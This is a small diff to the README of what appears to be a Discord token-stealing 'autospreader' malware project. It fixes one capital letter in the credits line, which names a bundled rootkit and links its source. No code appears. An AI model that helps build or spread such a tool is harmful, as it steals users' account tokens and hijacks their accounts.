@@ -6,7 +6,7 @@ This tool is a discord autospreader, meaning once infected it will grab the toke
 This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
 
 ## **Credits**
-The rootkit in the project was made by "bytecode77". the source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
+The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
 
 ## **Capabilities**
 
